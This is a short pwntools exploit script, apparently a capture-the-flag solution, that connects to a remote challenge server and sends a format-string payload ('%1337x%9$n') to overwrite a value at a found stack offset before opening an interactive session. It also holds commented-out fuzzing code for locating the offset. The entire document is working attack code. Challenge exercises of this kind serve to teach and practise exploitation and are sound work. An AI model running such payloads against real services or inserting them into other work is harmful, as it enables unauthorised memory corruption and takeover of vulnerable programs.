#!usr/bin/python3
from pwn import *

exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = '108.136.148.181', 9009
io = remote(host, port)

# fuzzing
# for i in range(20):
#     io = process(exe)
#     io.sendlineafter(b'ready kids?', f'AAAA%{i}$lx'.encode())
#     print(io.recvlines(2))
#     io.close()

# https://axcheron.github.io/exploit-101-format-strings/
payload = b'%1337x%9$n'
info('offset found at 6')
info('target found at 9')
info('payload length: %#x', len(payload))

io.sendline(payload)
io.interactive()